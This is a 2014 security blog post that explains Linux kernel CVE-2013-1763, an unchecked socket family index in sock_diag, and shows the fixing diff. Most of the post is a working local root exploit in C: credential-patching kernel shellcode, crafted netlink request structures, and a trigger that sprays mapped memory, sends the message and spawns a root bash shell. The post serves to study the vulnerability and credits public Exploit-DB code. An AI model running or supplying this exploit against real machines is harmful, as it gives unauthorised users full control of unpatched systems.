<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title> CVE-2013-1763 &middot; fz84 </title>

  
  <link rel="stylesheet" href="http://fanzy.me//css/poole.css">
  
  <link rel="stylesheet" href="http://fanzy.me//css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface|PT+Mono">

    
  



<link href="/themes/github.css" rel="stylesheet" type="text/css">
<script src="/js/rainbow.custom.min.js"></script>

<link rel="stylesheet" href="/css/code.css">

  
  <link rel="stylesheet" href="http://fanzy.me//font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.ico">

  
  <link href="" rel="alternate" type="application/rss+xml" title="fz84" />
</head>

<body>

<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>fz84</h1>
      <p class="lead">
       Read, write and do research in systems and security 
      </p>
    </div>

    <ul class="sidebar-nav">
      <li><a href="/">Home</a> </li>
      
        <li><a href="/post/"> Blogs </a></li>
      
    </ul>

    <p>&copy; 2015. All rights reserved. </p>
  </div>
</div>


    <div class="content container">
<div class="post">
  <h1>CVE-2013-1763</h1>
  <span class="post-date">Sat, Apr 19, 2014</span>
      

<p>Userland can send a netlink message requesting <code>SOCK_DIAG_BY_FAMILY</code> with a family greater or equal then <code>AF_MAX</code> &ndash; the array size of <code>sock_diag_handlers[]</code>. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.</p>

<h2 id="vulnerability:8058be7e9a7722a859fea59a1cfd58b1">Vulnerability</h2>

<pre><code class="language-diff">diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
index 602cd63..750f44f 100644
--- a/net/core/sock_diag.c
+++ b/net/core/sock_diag.c
@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
  if (nlmsg_len(nlh) &lt; sizeof(*req))
    return -EINVAL;
 
+ if (req-&gt;sdiag_family &gt;= AF_MAX)
+   return -EINVAL;
+
  hndl = sock_diag_lock_handler(req-&gt;sdiag_family);
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl-&gt;dump(skb, nlh); // hndl-&gt;dump executes !!
</code></pre>

<p>In <code>__sock_diag_rcv_msg</code> function, userland variable <code>req-&gt;sdiag_family</code> is passed uncheckly to <code>sock_diag_handler</code>, within which overflow and exploit happens.</p>

<pre><code class="language-c">static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
{
  if (sock_diag_handlers[family] == NULL)
    request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK, NETLINK_SOCK_DIAG, family);

  mutex_lock(&amp;sock_diag_table_mutex);
  return sock_diag_handlers[family];
}
</code></pre>

<p>Here the function returns a pointer <code>sock_diag_handlers + family</code>.</p>

<pre><code class="language-c">struct sock_diag_handler {
  __u8 family;
  int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
};
hndl = sock_diag_lock_handler(req-&gt;sdiag_family);
hndl-&gt;dump(skb, nlh); //(sock_diag_handlers + family + 8) executes !!
</code></pre>

<p>All story told, here we find that finally <code>(sock_diag_handlers + family + 8)</code> executes in kernel mode.</p>

<h2 id="exploits:8058be7e9a7722a859fea59a1cfd58b1">Exploits</h2>

<ol>
<li>Craft a piece of shell code.</li>
<li>Calcualte the value of <code>family</code> which points <code>sock_diag_handlers + family + 8</code> to the shell code.</li>
<li>Construct a package with large <code>family</code> and set it.</li>
<li>You got it.</li>
</ol>

<h2 id="shell-code:8058be7e9a7722a859fea59a1cfd58b1">Shell code</h2>

<ol>
<li>get <code>current</code> (pointer to the current process descriptor <code>task_struct</code>)</li>
<li>Manipulate <code>process credentials</code></li>
</ol>

<pre><code class="language-c">static long ugid;
void patch_current() {
    int i,j,k;
    char *current = *(char**)(((long)&amp;i) &amp; (-8192));
    long kbase = ((long)current)&gt;&gt;36;
    
    for (i=0; i&lt;4000; i+=4) {
        long *p = (void *)&amp;current[i];
        int *t = (void*) p[0];
        if ((p[0] != p[1]) || ((p[0]&gt;&gt;36) != kbase)) continue;
        for (j=0; j&lt;20; j++) {
            for (k = 0; k &lt; 8; k++)
            if (((int*)&amp;ugid)[k%2] != t[j+k])
            goto next;
            for (i = 0; i &lt; 8; i++)
            t[j+i] = 0;
            for (i = 0; i &lt; 10; i++)
            t[j+9+i] = -1;
            return;
next:;
        }
    }
}
</code></pre>

<h2 id="crafted-a-package:8058be7e9a7722a859fea59a1cfd58b1">Crafted a package</h2>

<pre><code class="language-c">struct {
  struct nlmsghdr nlh;
  struct unix_diag_req r;
} req;

struct nlmsghdr {
  __u32   nlmsg_len;  /* Length of message including header */
  __u16   nlmsg_type; /* Message content */
  __u16   nlmsg_flags;  /* Additional flags */
  __u32   nlmsg_seq;  /* Sequence number */
  __u32   nlmsg_pid;  /* Sending process port ID */
};

struct unix_diag_req {
  __u8  sdiag_family;
  __u8  sdiag_protocol;
  __u16 pad;
  __u32 udiag_states;
  __u32 udiag_ino;
  __u32 udiag_show;
  __u32 udiag_cookie[2];
};
</code></pre>

<h2 id="trigger:8058be7e9a7722a859fea59a1cfd58b1">Trigger</h2>

<pre><code class="language-c">int main()
{
  long u = getuid();
  long g = getgid();
  int i, f = socket(16,3,4);
  static int n[10] = {40,0x10014,0,0,45,-1};
 
  assert(mmap((void*)(1&lt;&lt;12), 1&lt;&lt;20, 3, 0x32, 0, 0)!=-1);
 
  setresuid(u,u,u); setresgid(g,g,g);
  ugid = (g&lt;&lt;32)|u;
 
  memcpy(1&lt;&lt;12, &amp;patch_current, 1024);
  for (i = 0; i &lt; (1&lt;&lt;17); i++) ((void**)(1&lt;&lt;12))[i] = &amp;patch_current;
  send(f, n, sizeof(n), 0);
  setuid(0);
  return execl(&quot;/bin/bash&quot;, &quot;-sh&quot;, 0);
}
</code></pre>

<h2 id="reference:8058be7e9a7722a859fea59a1cfd58b1">Reference</h2>

<p>All credit goes to the authors of <a href="http://www.exploit-db.com/exploits/24746/">this</a> and <a href="http://www.exploit-db.com/exploits/24555/">this</a> exploits.</p>

</div>
</div>

  </body>
</html>
